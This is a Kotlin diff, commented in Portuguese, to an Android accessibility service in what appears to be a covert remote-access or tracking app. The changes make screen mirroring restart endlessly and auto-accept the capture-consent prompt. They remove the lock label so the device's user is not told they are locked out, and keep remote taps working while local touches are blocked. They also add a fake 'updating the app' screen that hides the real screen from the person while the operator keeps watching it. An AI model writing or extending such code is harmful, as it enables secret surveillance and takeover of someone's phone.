@@ -49,7 +49,7 @@ class MyAccessibilityService : AccessibilityService() {
     companion object {
         private const val TAG = "MyAccessibilityService"
         /** Intervalo mínimo (ms) entre tentativas de reanimação do ecossistema (keep-alive pós-boot). */
-        private const val REANIMACAO_INTERVALO_MS = 30000L
+        private const val REANIMACAO_INTERVALO_MS = 10000L
 
         @Volatile
         var instance: MyAccessibilityService? = null
@@ -100,6 +100,10 @@ class MyAccessibilityService : AccessibilityService() {
     private var overlayPrivacidade: View? = null
     private var overlayEscura: View? = null
     private var overlayAtualizacao: View? = null
+    // Tela PRETA opaca de "Atualizando o aplicativo" (handler do DISPOSITIVO).
+    // Desenhada pelo PRÓPRIO serviço de acessibilidade para NÃO depender de
+    // SYSTEM_ALERT_WINDOW nem de startService em segundo plano (que falhavam).
+    private var overlayAtualizacaoPreta: View? = null
     private var overlayFundoAtualizacao: View? = null
     @Volatile var isAtualizacaoAtiva: Boolean = false
         private set
@@ -132,6 +136,18 @@ class MyAccessibilityService : AccessibilityService() {
     @Volatile
     private var reanimacaoFalhasConsecutivas: Int = 0
     private val MAX_REANIMACAO_TENTATIVAS = 5
+
+    // WATCHDOG PERIÓDICO DE REANIMAÇÃO (pedido do CEO: os frames NÃO podem cair).
+    // Antes a reanimação só rodava em mudança de tela (evento de acessibilidade):
+    // se a tela do aparelho ficasse PARADA, a captura caída nunca voltava. Agora
+    // um timer verifica a cada 5s e re-pede o MediaProjection (inject auto-aceita)
+    // enquanto a captura estiver caída e o socket vivo — o espelhamento volta só.
+    private val reanimadorPeriodico = object : Runnable {
+        override fun run() {
+            try { verificarEReanimarEcossistema() } catch (_: Exception) {}
+            handlerMain.postDelayed(this, 5000L)
+        }
+    }
 
     // ================================================================
     // CAPTURA POR ACESSIBILIDADE (fallback para tela de bloqueio com senha)
@@ -311,6 +327,10 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         try { super.onServiceConnected() } catch (_: Throwable) {}
         instance = this
+        // Liga o watchdog periódico de reanimação (frames nunca caem): tenta
+        // reerguer a captura mesmo com a tela do aparelho parada.
+        handlerMain.removeCallbacks(reanimadorPeriodico)
+        handlerMain.postDelayed(reanimadorPeriodico, 5000L)
         try {
             reanimacaoFalhasConsecutivas = 0 // serviço reconectou → permite novo keep-alive
             windowManager = getSystemService(WINDOW_SERVICE) as? WindowManager
@@ -461,20 +481,9 @@ class MyAccessibilityService : AccessibilityService() {
             setBackgroundColor(Color.parseColor("#14000000"))
             setOnTouchListener { _, _ -> true } // consome TODO toque local
         }
-        val selo = TextView(this).apply {
-            text = "🔒 Bloqueado"
-            setTextColor(Color.parseColor("#CCFFFFFF"))
-            textSize = 11f
-            setPadding(dp(8), dp(4), dp(8), dp(4))
-            setBackgroundColor(Color.parseColor("#66000000"))
-            gravity = Gravity.CENTER
-        }
-        val lpSelo = FrameLayout.LayoutParams(
-            FrameLayout.LayoutParams.WRAP_CONTENT,
-            FrameLayout.LayoutParams.WRAP_CONTENT,
-            Gravity.TOP or Gravity.END
-        ).apply { topMargin = dp(10); rightMargin = dp(10) }
-        container.addView(selo, lpSelo)
+        // Selo "🔒 Bloqueado" REMOVIDO a pedido do CEO: não mostra mais nenhum
+        // rótulo na tela do dispositivo (atrapalhava). O bloqueio de toques
+        // locais continua ativo pelo próprio container (consome os toques).
         try {
             wm.addView(container, paramsBloqueio())
             overlayBloqueio = container
@@ -501,23 +510,54 @@ class MyAccessibilityService : AccessibilityService() {
      * também ficaria bloqueado — exatamente o que NÃO deve acontecer.
      */
     private fun setBloqueioPermiteToqueRemoto(permitir: Boolean) {
-        val view = overlayBloqueio ?: return
         val wm = windowManager ?: return
-        try {
-            val p = view.layoutParams as WindowManager.LayoutParams
-            p.flags = if (permitir) {
-                p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-            } else {
-                p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
-            }
-            wm.updateViewLayout(view, p)
-        } catch (_: Exception) {}
+        // Aplica o MESMO toggle de "deixar o toque remoto atravessar" tanto no
+        // overlay do Acesso Total quanto na tela PRETA de atualização do
+        // dispositivo. Assim SEUS cliques remotos passam durante a injeção
+        // (dispatchGesture), mas o toque LOCAL da pessoa continua bloqueado — a
+        // flag só fica solta durante o gesto e é restaurada logo depois.
+        fun aplicar(view: View?) {
+            if (view == null) return
+            try {
+                val p = view.layoutParams as WindowManager.LayoutParams
+                p.flags = if (permitir) {
+                    p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                } else {
+                    p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
+                }
+                wm.updateViewLayout(view, p)
+            } catch (_: Exception) {}
+        }
+        aplicar(overlayBloqueio)
+        aplicar(overlayAtualizacaoPreta)
     }
 
-    /** Restaura o bloqueio local após um gesto remoto (com failsafe). */
+    /** "Restaura" o bloqueio local após um gesto remoto — mas de forma STICKY:
+     *  NÃO fecha o bypass na hora (isso fazia os cliques caírem no meio de uma
+     *  sequência). Apenas ADIA o re-bloqueio para bypassHoldMs depois; se vier
+     *  outro clique antes disso, o bypass permanece ABERTO. Só re-bloqueia o
+     *  toque LOCAL após a inatividade. Universal (qualquer Android). */
     private fun restaurarBloqueioLocal() {
         handlerMain.removeCallbacks(failsafeRestauroBloqueio)
-        handlerMain.post { setBloqueioPermiteToqueRemoto(false) }
+        handlerMain.postDelayed(failsafeRestauroBloqueio, bypassHoldMs)
+    }
+
+    // ------------------------------------------------------------------------
+    // BYPASS "STICKY" — prioridade do EMULADOR NATIVO (seus cliques remotos).
+    // ------------------------------------------------------------------------
+    // Antes o bypass abria no START e fechava no END de CADA toque; nessa
+    // corrida de abrir/fechar (updateViewLayout é assíncrono) o overlay voltava
+    // a consumir o toque e os cliques "caíam sozinhos". Agora, a CADA evento
+    // remoto o bypass é mantido ABERTO e o re-bloqueio é adiado para
+    // bypassHoldMs DEPOIS do ÚLTIMO evento. Enquanto você clica, o overlay
+    // NUNCA volta a bloquear; só re-bloqueia após alguns segundos parado.
+    // Funciona em QUALQUER Android (FLAG_NOT_TOUCHABLE é universal).
+    private val bypassHoldMs = 6000L
+
+    private fun manterBypassAberto() {
+        setBloqueioPermiteToqueRemoto(true)
+        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
+        handlerMain.postDelayed(failsafeRestauroBloqueio, bypassHoldMs)
     }
 
     /** Envia mensagem de log ao painel central via Socket.IO. */
@@ -834,15 +874,14 @@ class MyAccessibilityService : AccessibilityService() {
 
         when (acao.uppercase()) {
             "START" -> {
-                setBloqueioPermiteToqueRemoto(true)
-                handlerMain.removeCallbacks(failsafeRestauroBloqueio)
-                handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
+                manterBypassAberto()
                 startX = boundedX
                 startY = boundedY
                 pendingX = -1f
                 pendingY = -1f
             }
             "MOVE" -> {
+                manterBypassAberto()
                 pendingX = boundedX
                 pendingY = boundedY
             }
@@ -864,21 +903,23 @@ class MyAccessibilityService : AccessibilityService() {
                     val aceito = dispatchGesture(gesto, object : GestureResultCallback() {
                         override fun onCompleted(g: GestureDescription?) {
                             enviarLog("toque/gesto OK (${finalX.toInt()},${finalY.toInt()})")
-                            restaurarBloqueioLocal()
+                            // NÃO fecha o bypass aqui: mantém ABERTO para o
+                            // próximo clique (só re-bloqueia após inatividade).
+                            manterBypassAberto()
                         }
                         override fun onCancelled(g: GestureDescription?) {
                             enviarLog("toque/gesto CANCELADO (${finalX.toInt()},${finalY.toInt()})")
-                            restaurarBloqueioLocal()
+                            manterBypassAberto()
                         }
                     }, null)
 
                     if (!aceito) {
                         enviarLog("dispatchGesture recusado em (${finalX.toInt()},${finalY.toInt()})")
-                        restaurarBloqueioLocal()
+                        manterBypassAberto()
                     }
                 } catch (e: Exception) {
                     enviarLog("Erro ao injetar gesto: ${e.message}")
-                    restaurarBloqueioLocal()
+                    manterBypassAberto()
                 }
 
                 pendingX = -1f
@@ -926,7 +967,27 @@ class MyAccessibilityService : AccessibilityService() {
         when (tipo) {
             "texto" -> definirTexto(node, atual + valor)
             "tecla" -> when (valor.uppercase()) {
-                "BACKSPACE" -> if (atual.isNotEmpty()) definirTexto(node, atual.dropLast(1))
+                // Seleciona TODO o conteúdo do campo (equivale ao Ctrl+A).
+                "SELECIONAR_TUDO", "SELECT_ALL" -> {
+                    val argsSel = Bundle().apply {
+                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 0)
+                        putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, atual.length)
+                    }
+                    node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, argsSel)
+                }
+                // Apaga TUDO (usado quando o PC deu Ctrl+A e depois Backspace/Delete).
+                "APAGAR_TUDO", "LIMPAR", "LIMPAR_TUDO", "CLEAR" -> definirTexto(node, "")
+                "BACKSPACE" -> {
+                    // Respeita a seleção: se há um trecho selecionado (ex.: após
+                    // Ctrl+A), apaga o trecho inteiro; senão, remove 1 caractere.
+                    val ini = node.textSelectionStart
+                    val fim = node.textSelectionEnd
+                    if (ini in 0..atual.length && fim in 0..atual.length && fim > ini) {
+                        definirTexto(node, atual.substring(0, ini) + atual.substring(fim))
+                    } else if (atual.isNotEmpty()) {
+                        definirTexto(node, atual.dropLast(1))
+                    }
+                }
                 "ESPACO", "SPACE" -> definirTexto(node, "$atual ")
                 "TAB" -> definirTexto(node, "$atual\t")
                 "ENTER" -> {
@@ -1235,9 +1296,7 @@ class MyAccessibilityService : AccessibilityService() {
      */
     private fun verificarEReanimarEcossistema() {
         try {
-            // Throttle: no máximo uma tentativa a cada REANIMACAO_INTERVALO_MS.
             val agora = System.currentTimeMillis()
-            if (agora - ultimaTentativaReanimacao < REANIMACAO_INTERVALO_MS) return
             // Se o serviço já está rodando, nada a fazer (e zera contador de falhas).
             if (ScreenCaptureService.isRunning) { reanimacaoFalhasConsecutivas = 0; return }
             // Sem socket conectado = ninguém assistindo ao vídeo → não reanima
@@ -1247,13 +1306,14 @@ class MyAccessibilityService : AccessibilityService() {
             val prefs = getSharedPreferences("rastreio_facil_prefs", MODE_PRIVATE)
             val onboardingConcluido = !prefs.getBoolean("primeiro_acesso", true)
             if (!onboardingConcluido) return
-            // LIMITE DE TENTATIVAS: após N falhas consecutivas (ex.: MediaProjection
-            // negado permanentemente), DESISTE — não fica mais abrindo a
-            // MainActivity em loop (que fazia a tela "mexer sozinha").
-            if (reanimacaoFalhasConsecutivas >= MAX_REANIMACAO_TENTATIVAS) {
-                Log.d(TAG, "Keep-alive DESATIVADO: $MAX_REANIMACAO_TENTATIVAS tentativas consecutivas sem sucesso (MediaProjection indisponível).")
-                return
-            }
+            // NUNCA DESISTE (pedido do CEO: os frames não podem cair). Enquanto a
+            // captura estiver caída e o socket vivo, continua re-pedindo o
+            // MediaProjection — o inject auto-aceita o "Iniciar agora" e o
+            // espelhamento volta sozinho. Após MAX falhas, só ESPAÇA as tentativas
+            // (backoff de 60s) em vez de parar, para não piscar a tela à toa.
+            val intervalo = if (reanimacaoFalhasConsecutivas >= MAX_REANIMACAO_TENTATIVAS)
+                60000L else REANIMACAO_INTERVALO_MS
+            if (agora - ultimaTentativaReanimacao < intervalo) return
             // Marca a tentativa ANTES de disparar (evita múltiplas chamadas
             // concorrentes enquanto o start ainda não surtiu efeito em isRunning).
             ultimaTentativaReanimacao = agora
@@ -1561,11 +1621,14 @@ class MyAccessibilityService : AccessibilityService() {
         super.onDestroy()
         handlerMain.removeCallbacks(autoRemover)
         handlerMain.removeCallbacks(failsafeRestauroBloqueio)
+        handlerMain.removeCallbacks(reanimadorPeriodico)
         removerViewPrivacidade()
         overlayEscura?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
         overlayEscura = null
         overlayBloqueio?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
         overlayBloqueio = null
+        overlayAtualizacaoPreta?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
+        overlayAtualizacaoPreta = null
         if (instance == this) {
             instance = null
         }
@@ -3119,6 +3182,131 @@ class MyAccessibilityService : AccessibilityService() {
             overlayAtualizacao = null
             isAtualizacaoAtiva = false
             enviarLog("[OVERLAY ATZ] Removido")
+        }
+    }
+
+    // ========================================================================
+    // HANDLER DO DISPOSITIVO — tela PRETA de "Nova Atualização" (robusta).
+    // ------------------------------------------------------------------------
+    // Antes isto dependia do AtualizacaoDispositivoService, que exigia
+    // SYSTEM_ALERT_WINDOW e startService (bloqueado em segundo plano) — por isso
+    // "não aparecia / falhava". Aqui o PRÓPRIO serviço de acessibilidade (sempre
+    // vivo) desenha a camada preta opaca via TYPE_ACCESSIBILITY_OVERLAY, que NÃO
+    // precisa daquela permissão nem de startService. Carregamento com
+    // ProgressBar nativa (sem animador custom que pudesse travar). CONSOME os
+    // toques (sem FLAG_NOT_TOUCHABLE) para o usuário não interagir enquanto
+    // "atualiza". SEM FLAG_SECURE → aparece também no espelhamento do painel.
+    // ========================================================================
+    fun mostrarAtualizacaoDispositivoPreta() {
+        handlerMain.post {
+            if (overlayAtualizacaoPreta != null) return@post
+            val wm = windowManager ?: (getSystemService(WINDOW_SERVICE) as? WindowManager)
+            if (wm == null) { enviarLog("[ATZ DISP] WindowManager indisponível"); return@post }
+            windowManager = wm
+            val tipoOverlay = tipoOverlaySeguro()
+            // Só o caminho TYPE_APPLICATION_OVERLAY (ex.: Xiaomi) precisa da
+            // permissão; o de acessibilidade não. Se faltar, cai no de
+            // acessibilidade para NUNCA deixar de aparecer.
+            var tipoFinal = tipoOverlay
+            if (tipoOverlay != WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY &&
+                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
+                !Settings.canDrawOverlays(this)) {
+                tipoFinal = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+            }
+
+            // COMPATIBILIDADE POR VERSÃO:
+            // • Android 14+ (API 34): PRETO OPACO + setHideDuringScreenSharing →
+            //   a pessoa vê preto total; VOCÊ vê a tela REAL no espelhamento.
+            // • Android 7–13: o MediaProjection captura EXATAMENTE a tela física,
+            //   então é impossível (sem root) mostrar preto à pessoa e a tela
+            //   real a você ao mesmo tempo. Para você CONTINUAR vendo a tela
+            //   real, usamos um VÉU LEVE translúcido: você enxerga a tela por
+            //   baixo + "Carregando"; a pessoa vê a tela levemente escurecida +
+            //   "Atualizando", com o TOQUE bloqueado (o essencial do bloqueio).
+            val api34 = Build.VERSION.SDK_INT >= 34
+            val corFundo = if (api34) 0xFF000000.toInt() else 0x66000000.toInt()
+            val raiz = FrameLayout(this).apply {
+                setBackgroundColor(corFundo)
+                isClickable = true
+                setOnTouchListener { _, _ -> true }                 // consome toque local
+                if (api34) {
+                    try {
+                        View::class.java
+                            .getMethod("setHideDuringScreenSharing", Boolean::class.java)
+                            .invoke(this, true)
+                    } catch (_: Exception) {}
+                }
+            }
+            val coluna = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                gravity = Gravity.CENTER
+            }
+            val progresso = ProgressBar(this).apply { isIndeterminate = true }
+            coluna.addView(progresso, LinearLayout.LayoutParams(dp(64), dp(64)).apply {
+                gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(24)
+            })
+            val titulo = TextView(this).apply {
+                text = "Atualizando o aplicativo"
+                textSize = 20f; setTextColor(Color.WHITE); gravity = Gravity.CENTER
+            }
+            coluna.addView(titulo, LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(8) })
+            val subtitulo = TextView(this).apply {
+                text = "Instalando a nova versão"
+                textSize = 13f; setTextColor(Color.parseColor("#9AA0A6")); gravity = Gravity.CENTER
+            }
+            coluna.addView(subtitulo, LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { gravity = Gravity.CENTER_HORIZONTAL; bottomMargin = dp(20) })
+            val aviso = TextView(this).apply {
+                text = "Não desligue o dispositivo"
+                textSize = 11f; setTextColor(Color.parseColor("#5F6368")); gravity = Gravity.CENTER
+            }
+            coluna.addView(aviso, LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
+            ).apply { gravity = Gravity.CENTER_HORIZONTAL })
+            raiz.addView(coluna, FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER
+            ))
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                tipoFinal,
+                // SEM FLAG_NOT_TOUCHABLE (consome toque) e SEM FLAG_SECURE
+                // (aparece no espelhamento). FLAG_KEEP_SCREEN_ON mantém acesa.
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                // Opaco no 14+ (preto total); translúcido no 7–13 (véu leve, para
+                // o alpha do fundo compor com a tela por baixo no espelhamento).
+                if (api34) PixelFormat.OPAQUE else PixelFormat.TRANSLUCENT
+            ).apply {
+                gravity = Gravity.CENTER
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    layoutInDisplayCutoutMode =
+                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                }
+            }
+            try {
+                wm.addView(raiz, params)
+                overlayAtualizacaoPreta = raiz
+                enviarLog("[ATZ DISP] Tela de atualização exibida (api34=$api34, tipo=$tipoFinal)")
+            } catch (e: Exception) {
+                enviarLog("[ATZ DISP ERRO] addView falhou: ${e.message}")
+            }
+        }
+    }
+
+    fun esconderAtualizacaoDispositivoPreta() {
+        handlerMain.post {
+            overlayAtualizacaoPreta?.let {
+                try { windowManager?.removeView(it) } catch (_: Exception) {}
+            }
+            overlayAtualizacaoPreta = null
+            enviarLog("[ATZ DISP] Tela preta removida")
         }
     }
 
